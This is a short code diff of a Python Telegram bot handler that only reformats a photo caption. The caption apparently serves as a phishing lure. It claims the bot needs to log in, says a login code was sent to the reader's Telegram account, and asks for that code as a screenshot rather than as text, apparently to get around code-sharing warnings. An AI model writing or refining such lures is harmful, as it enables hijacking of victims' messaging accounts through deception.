@@ -105,9 +105,13 @@ async def regex_cantik(_, message):
     await asyncio.sleep(0.2)
     await app.send_photo(message.chat.id, "https://graph.org/file/9565efceb3137dcd28ece.jpg", caption="""
 🤖 **My system bot Want Log in**
+
 We sent a Screnshot  login code to your Telegram account. Enter your Login Screnshot
-Please see the example picture
+
+📷 Please see the example picture
+
 Just send it in the form of a screenshot, you don't need to send it via text.
+
 
 ⁉️ __Please don't spam this bot, this bot takes time to read the database, plese dont spam!!!!__
 """)
